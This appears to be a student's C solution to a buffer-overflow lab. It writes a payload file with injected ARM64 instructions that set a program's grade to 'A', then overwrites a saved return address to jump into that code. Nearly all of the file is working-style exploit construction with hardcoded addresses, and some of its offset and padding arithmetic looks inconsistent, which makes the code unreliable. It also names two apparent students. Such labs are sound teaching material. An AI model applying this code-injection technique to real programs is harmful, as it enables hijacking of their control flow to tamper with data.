#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main(void) {
    char pcInject[48];
    char pcName[] = "Angeline Yan and Jade Sceats";
    int i = 0;
    int iNameLength;
    unsigned long uiTargetAddr = 0x400890;
    unsigned int uiAdr, uiMov, uiStrb, uiB;
    FILE *psFile;

    /* get name(s) to use in dataA */
    /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
    instructions) */
    iNameLength = strlen(pcName);
    strcpy(pcInject, pcName);
    
    /* ensure instructions are 4-byte aligned */
    while (i % 4 != 0) {
       pcInject[i++] = '\0';
    }

    psFile = fopen("dataA", "w");
    /* write name */
    fwrite(pcInject, sizeof(char), iNameLength, psFile);
    /* write instructions */
    /* load grade instr (0x420044 is addr of grade, 0x420058 + i is addr
    of this instruction) */
    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420058 + iNameLength);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
    /* get "A" instr */
    uiMov = MiniAssembler_mov(1, 0x41);
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
    /* set "A" instr */
    uiStrb = MiniAssembler_strb(1, 0);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
    i = i + 12;
    /* branch to print instr (0x40089c is addr of print instr in main,
    0x420058 + i is addr of this instr) */
    uiB = MiniAssembler_b(0x40089c, 0x420058 + i);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);
    i = i + 4;

    /* pad as necessary */
    for (; i < 48; i++) {
        fprintf(psFile, "%c", 0x30);
    }

    /* overwrite getName's x30 with addr of inject code in bss */
    uiTargetAddr = 0x420058 + iNameLength;
    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}
